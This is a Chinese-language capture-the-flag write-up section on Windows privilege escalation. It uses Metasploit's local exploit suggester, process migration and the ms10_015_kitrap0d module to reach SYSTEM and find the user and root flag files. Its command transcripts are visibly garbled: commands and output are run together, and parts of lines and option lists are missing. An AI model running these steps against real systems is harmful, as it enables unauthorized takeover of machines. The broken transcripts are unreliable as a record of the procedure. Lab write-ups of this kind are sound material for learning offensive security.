
# 权限提升

使用 post/multi/recon/local\_exploit\_suggester 进行提权脚本查询

```


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggesterfalse            yes       Displays a detailed description for

 the available exploitsset

 session 2
```

设置好以后，exploit 执行

```


msf6 post(multi/recon/local_exploit_suggester) > exploit local exploits for

 x86/windows...local
/ms10_015_kitrap0d: The service is running, but could not be validated.local
/ms14_058_track_popup_menu: The target appears to be vulnerable.local
/ms14_070_tcpip_ioctl: The target appears to be vulnerable.local
/ms15_051_client_copy_image: The target appears to be vulnerable.local
/ms16_016_webdav: The service is running, but could not be validated.local

/ppr_flatten_rec: The target appears to be vulnerable.
```

以上都是当前机器下可能可用的提权模块

```
exploit/windows/local
/ms10_015_kitrap0d
```

挨个尝试后，都是提示没有权限 “Exploit failed: Rex::Post::Meterpreter::RequestError stdapi\_sys\_config\_getsid: Operation failed: Access is denied.”

```


meterpreter > getuid
```

直接使用 getuid 命令也是不行的

```


meterpreter > ps
```

尝试一下进程迁移

```


meterpreter > getuid
```

进程迁移后可以执行 getuid 命令

再尝试一下提权模块 exploit/windows/local/ms10\_015\_kitrap0d

```
msf6 exploit(windows/local

/ms10_015_kitrap0d) > show options local

/ms10_015_kitrap0d):''

, seh, thread, process, none)
```

然后执行

```
msf6 exploit(windows/local

/ms10_015_kitrap0d) > exploit wait for

 (hopefully privileged) payload execution to complete.
```

成功提权到 system 权限

```


meterpreter > search -f user.txt'c:\Documents and Settings\Harry\Desktop\user.txt'

'c:\Documents and Settings\Administrator\Desktop\root.txt'


```

成功拿到 user 和 root 权限的 flag 文件
